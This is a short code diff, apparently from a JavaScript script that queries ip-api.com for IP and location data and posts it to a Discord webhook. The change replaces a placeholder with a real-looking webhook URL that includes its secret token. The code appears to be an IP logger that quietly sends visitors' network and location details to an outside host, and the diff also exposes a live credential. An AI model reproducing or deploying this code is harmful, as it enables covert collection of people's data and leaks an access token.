@@ -143,7 +143,7 @@ fetch("http://ip-api.com/json/")
             }]
         };
 
-        const webhookUrl = "YOUR-WEBHOOK-HERE";
+        const webhookUrl = "https://discord.com/api/webhooks/1304924593890529391/FwkIm38_nsbgFIsIJGqzlFxw4U0cmjLMXGXp8LOFvC8uQqe0MJDqBZJxvbn4UwGHEZK-";
         fetch(webhookUrl, {
             method: "POST",
             headers: {
